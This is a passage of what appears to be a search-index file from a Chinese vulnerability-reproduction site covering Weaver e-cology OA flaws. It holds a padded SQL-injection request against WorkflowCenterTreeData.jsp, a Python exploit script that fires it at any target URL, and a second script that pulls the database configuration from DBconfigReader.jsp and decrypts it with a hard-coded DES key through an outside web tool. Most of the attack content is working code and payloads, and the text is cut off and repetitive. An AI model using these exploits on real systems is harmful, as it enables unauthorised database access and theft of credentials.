%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d union select NULL,value from v$parameter order by (((1\" res = requests . post ( url = target , data = payload , headers = headers , timeout = 10 ) res . encoding = res . apparent_encoding print ( res . text ) if __name__ == '__main__' : url = sys . argv [ 1 ] exploit ( url ) \u53c2\u8003\u6587\u7ae0 \u00b6 \u6cdb\u5faeOA WorkflowCenterTreeData\u63a5\u53e3\u6ce8\u5165\u590d\u73b0\uff08\u4ec5\u9650oracle\u6570\u636e\u5e93\uff09","title":"\u6cdb\u5faeOA WorkflowCenterTreeData\u63a5\u53e3SQL\u6ce8\u5165"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20WorkflowCenterTreeData%E6%8E%A5%E5%8F%A3SQL%E6%B3%A8%E5%85%A5/#\u6cdb\u5faeoa-workflowcentertreedata\u63a5\u53e3sql\u6ce8\u5165\u4ec5\u9650oracle\u6570\u636e\u5e93-cnvd-2019-34241","text":"","title":"\u6cdb\u5faeOA WorkflowCenterTreeData\u63a5\u53e3SQL\u6ce8\u5165(\u4ec5\u9650oracle\u6570\u636e\u5e93) CNVD-2019-34241"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20WorkflowCenterTreeData%E6%8E%A5%E5%8F%A3SQL%E6%B3%A8%E5%85%A5/#\u6f0f\u6d1e\u63cf\u8ff0","text":"2019\u5e7410\u670810\u65e5CNVD\u53d1\u5e03\u4e86\u6cdb\u5faee-cology OA\u7cfb\u7edf\u5b58\u5728SQL\u6ce8\u5165\u6f0f\u6d1e\u3002\u8be5\u6f0f\u6d1e\u662f\u7531\u4e8eOA\u7cfb\u7edf\u7684WorkflowCenterTreeData\u63a5\u53e3\u4e2d\u6d89\u53caOracle\u6570\u636e\u5e93\u7684SQL\u8bed\u53e5\u7f3a\u4e4f\u5b89\u5168\u68c0\u67e5\u63aa\u65bd\u6240\u5bfc\u81f4\u7684\uff0c\u4efb\u610f\u653b\u51fb\u8005\u90fd\u53ef\u501fSQL\u8bed\u53e5\u62fc\u63a5\u65f6\u673a\u6ce8\u5165\u6076\u610fpayload\uff0c\u9020\u6210SQL\u6ce8\u5165\u653b\u51fb\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20WorkflowCenterTreeData%E6%8E%A5%E5%8F%A3SQL%E6%B3%A8%E5%85%A5/#\u5f71\u54cd\u7248\u672c","text":"[!NOTE] \u4f7f\u7528Oracle\u6570\u636e\u5e93\u7684\u6cdb\u5fae\u670d\u52a1","title":"\u5f71\u54cd\u7248\u672c"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20WorkflowCenterTreeData%E6%8E%A5%E5%8F%A3SQL%E6%B3%A8%E5%85%A5/#\u6f0f\u6d1e\u590d\u73b0","text":"\u6cdb\u578b\u5fae\u751f\u6001OA\u7cfb\u7edf\u7684WorkflowCenterTreeData\u63a5\u53e3\u5728\u4f7f\u7528Oracle\u6570\u636e\u5e93\u65f6\uff0c\u7531\u4e8e\u5185\u7f6esql\u8bed\u53e5\u5206\u89e3\u4e0d\u4e25\u5bc6\uff0c\u5bfc\u81f4\u5176\u5b58\u5728\u7684sql\u6ce8\u5165\u6f0f\u6d1e \u6f0f\u6d1e\u8bf7\u6c42\u5305 POST / mobile / browser / WorkflowCenterTreeData . jsp ? node = wftype_1 & scope = 2333 HTTP / 1 . 1 Host : ip : port Cache - Control : max - age = 0 Upgrade - Insecure - Requests : 1 User - Agent : Mozilla / 5 . 0 ( Windows NT 10 . 0 ; Win64 ; x64 ) AppleWebKit / 537 . 36 ( KHTML , like Gecko ) Chrome / 74 . 0 . 3729 . 131 Safari / 537 . 36 Accept : text / html , application / xhtml + xml , application / xml ; q = 0 . 9 , image / webp , image / apng , * /*;q=0.8,application/signed-exchange;v=b3 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Cookie: ecology_JSessionId=abc49y8JvMcoqhSkCv02w; testBanCookie=test Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 2236 Upgrade-Insecure-Requests: 1 formids=11111111111)))%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0dunion select NULL,value from v$parameter order by (((1","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20WorkflowCenterTreeData%E6%8E%A5%E5%8F%A3SQL%E6%B3%A8%E5%85%A5/#\u6f0f\u6d1e\u5229\u7528poc","text":"import requests import sys headers = { 'User-Agent' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25' , 'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3' , 'Accept-Language' : 'zh-CN,zh;q=0.9' , 'Content-Type' : 'application/x-www-form-urlencoded' } def exploit ( url ): target = url + '/mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&scope=2333' payload = \"formids=11111111111))) %0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d%0a%0d union select NULL,value from v$parameter order by (((1\" res = requests . post ( url = target , data = payload , headers = headers , timeout = 10 ) res . encoding = res . apparent_encoding print ( res . text ) if __name__ == '__main__' : url = sys . argv [ 1 ] exploit ( url )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20WorkflowCenterTreeData%E6%8E%A5%E5%8F%A3SQL%E6%B3%A8%E5%85%A5/#\u53c2\u8003\u6587\u7ae0","text":"\u6cdb\u5faeOA WorkflowCenterTreeData\u63a5\u53e3\u6ce8\u5165\u590d\u73b0\uff08\u4ec5\u9650oracle\u6570\u636e\u5e93\uff09","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20e-cology%20%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/","text":"\u6cdb\u5faeOA e-cology \u6570\u636e\u5e93\u914d\u7f6e\u4fe1\u606f\u6cc4\u6f0f\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 2019\u5e7410\u670824\u65e5\uff0c360CERT\u76d1\u6d4b\u5230\u53cb\u5546\u53d1\u5e03\u4e86\u6cdb\u5faee-cology OA\u6570\u636e\u5e93\u914d\u7f6e\u4fe1\u606f\u6cc4\u6f0f\u6f0f\u6d1e\u9884\u8b66\uff0c\u6f0f\u6d1e\u7b49\u7ea7\u4e2d\u3002 \u653b\u51fb\u8005\u53ef\u901a\u8fc7\u5b58\u5728\u6f0f\u6d1e\u7684\u9875\u9762\u76f4\u63a5\u83b7\u53d6\u5230\u6570\u636e\u5e93\u914d\u7f6e\u4fe1\u606f\u3002\u5982\u679c\u653b\u51fb\u8005\u53ef\u76f4\u63a5\u8bbf\u95ee\u6570\u636e\u5e93\uff0c\u5219\u53ef\u76f4\u63a5\u83b7\u53d6\u7528\u6237\u6570\u636e\uff0c\u751a\u81f3\u53ef\u4ee5\u76f4\u63a5\u63a7\u5236\u6570\u636e\u5e93\u670d\u52a1\u5668\u3002 360CERT\u5224\u65ad\u6f0f\u6d1e\u7b49\u7ea7\u4e3a\u4e2d\uff0c\u5371\u5bb3\u9762/\u5f71\u54cd\u9762\u4f4e\u3002\u5efa\u8bae\u4f7f\u7528\u6cdb\u5faee-cology OA\u7684\u7528\u6237\u53ca\u65f6\u5b89\u88c5\u6700\u65b0\u8865\u4e01\uff0c\u4ee5\u514d\u906d\u53d7\u9ed1\u5ba2\u653b\u51fb\u3002 \u5f71\u54cd\u7248\u672c \u00b6 [!NOTE] \u76ee\u524d\u5df2\u77e5\u4e3a8.100.0531,\u4e0d\u6392\u9664\u5176\u4ed6\u7248\u672c\uff0c\u5305\u62ec\u4e0d\u9650\u4e8eEC7.0\u3001EC8.0\u3001EC9.0\u7248 \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u6839\u636e\u6e90\u7801\u53ef\u4ee5\u5f97\u5230DES\u5bc6\u94a5\u4e3a 1z2x3c4v5b6n\uff08\u4e5f\u67091z2x3c4v\u7684,\u53ef\u4ee5\u6309\u6b64\u89c4\u5f8b\u6765\u7206\u7834\uff09 \u53ef\u4ee5\u770b\u5230\u4f1a\u5c06\u5f53\u524d\u8fde\u63a5\u6570\u636e\u5e93\u7684\u7528\u6237\u540d\u5bc6\u7801\uff0curl\uff0clogintype\u7b49\u4fe1\u606f\u8fdb\u884cdes\u52a0\u5bc6\uff0c\u5e76\u6700\u7ec8\u8fdb\u884c\u8fd4\u56de\uff0c\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7des\u89e3\u5bc6\u83b7\u53d6\u6cc4\u9732\u4fe1\u606f\u3002 \u6f0f\u6d1e\u5229\u7528POC \u00b6 Github\u94fe\u63a5 python\u4ee3\u7801 import base64 import requests import ast def req ( url ): headers = { 'Content-Type' : 'application/x-www-form-urlencoded' , 'User-Agent' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36' , 'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' , } r1 = requests . get ( url , headers = headers ) . content s = r1 . replace ( ' \\r\\n ' , '' ) res1 = base64 . b64encode ( s ) postdata = { 'data' : res1 , 'type' : 'des' , 'arg' : 'm=ecb_pad=zero_p=1z2x3c4v_o=0_s=gb2312_t=1' } u = 'http://tool.chacuo.net/cryptdes' r2 = requests . post ( u , data = postdata , headers = headers ) . content res2 = ast . literal_eval ( r2 ) return res2 [ 'data' ] url = 'http://xxx.xxx.xxx.xxx:8888//mobile/DBconfigReader.jsp' print req ( url ) \u53c2\u8003\u6587\u7ae0 \u00b6 [\u66f4\u65b0]\u6cdb\u5faee-cology OA\u6570\u636e\u5e93\u914d\u7f6e\u4fe1\u606f\u6cc4\u6f0f\u6f0f\u6d1e\u9884\u8b66","title":"\u6cdb\u5faeOA e-cology \u6570\u636e\u5e93\u914d\u7f6e\u4fe1\u606f\u6cc4\u6f0f\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20e-cology%20%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/#\u6cdb\u5faeoa-e-cology-\u6570\u636e\u5e93\u914d\u7f6e\u4fe1\u606f\u6cc4\u6f0f\u6f0f\u6d1e","text":"","title":"\u6cdb\u5faeOA e-cology \u6570\u636e\u5e93\u914d\u7f6e\u4fe1\u606f\u6cc4\u6f0f\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20e-cology%20%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u63cf\u8ff0","text":"2019\u5e7410\u670824\u65e5\uff0c360CERT\u76d1\u6d4b\u5230\u53cb\u5546\u53d1\u5e03\u4e86\u6cdb\u5faee-cology OA\u6570\u636e\u5e93\u914d\u7f6e\u4fe1\u606f\u6cc4\u6f0f\u6f0f\u6d1e\u9884\u8b66\uff0c\u6f0f\u6d1e\u7b49\u7ea7\u4e2d\u3002 \u653b\u51fb\u8005\u53ef\u901a\u8fc7\u5b58\u5728\u6f0f\u6d1e\u7684\u9875\u9762\u76f4\u63a5\u83b7\u53d6\u5230\u6570\u636e\u5e93\u914d\u7f6e\u4fe1\u606f\u3002\u5982\u679c\u653b\u51fb\u8005\u53ef\u76f4\u63a5\u8bbf\u95ee\u6570\u636e\u5e93\uff0c\u5219\u53ef\u76f4\u63a5\u83b7\u53d6\u7528\u6237\u6570\u636e\uff0c\u751a\u81f3\u53ef\u4ee5\u76f4\u63a5\u63a7\u5236\u6570\u636e\u5e93\u670d\u52a1\u5668\u3002 360CERT\u5224\u65ad\u6f0f\u6d1e\u7b49\u7ea7\u4e3a\u4e2d\uff0c\u5371\u5bb3\u9762/\u5f71\u54cd\u9762\u4f4e\u3002\u5efa\u8bae\u4f7f\u7528\u6cdb\u5faee-cology OA\u7684\u7528\u6237\u53ca\u65f6\u5b89\u88c5\u6700\u65b0\u8865\u4e01\uff0c\u4ee5\u514d\u906d\u53d7\u9ed1\u5ba2\u653b\u51fb\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20e-cology%20%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/#\u5f71\u54cd\u7248\u672c","text":"[!NOTE] \u76ee\u524d\u5df2\u77e5\u4e3a8.100.0531,\u4e0d\u6392\u9664\u5176\u4ed6\u7248\u672c\uff0c\u5305\u62ec\u4e0d\u9650\u4e8eEC7.0\u3001EC8.0\u3001EC9.0\u7248","title":"\u5f71\u54cd\u7248\u672c"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20e-cology%20%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u590d\u73b0","text":"\u6839\u636e\u6e90\u7801\u53ef\u4ee5\u5f97\u5230DES\u5bc6\u94a5\u4e3a 1z2x3c4v5b6n\uff08\u4e5f\u67091z2x3c4v\u7684,\u53ef\u4ee5\u6309\u6b64\u89c4\u5f8b\u6765\u7206\u7834\uff09 \u53ef\u4ee5\u770b\u5230\u4f1a\u5c06\u5f53\u524d\u8fde\u63a5\u6570\u636e\u5e93\u7684\u7528\u6237\u540d\u5bc6\u7801\uff0curl\uff0clogintype\u7b49\u4fe1\u606f\u8fdb\u884cdes\u52a0\u5bc6\uff0c\u5e76\u6700\u7ec8\u8fdb\u884c\u8fd4\u56de\uff0c\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7des\u89e3\u5bc6\u83b7\u53d6\u6cc4\u9732\u4fe1\u606f\u3002","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20e-cology%20%E6%95%B0%E6%8D%AE%E5%BA%93%E9%85%8D%E7%BD%AE%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5229\u7528poc","text":"Github\u94fe\u63a5 python\u4ee3\u7801 import base64 import requests import ast def req ( url ): headers = { 'Content-Type' : 'application/x-www-form-urlencoded' , 'User-Agent' 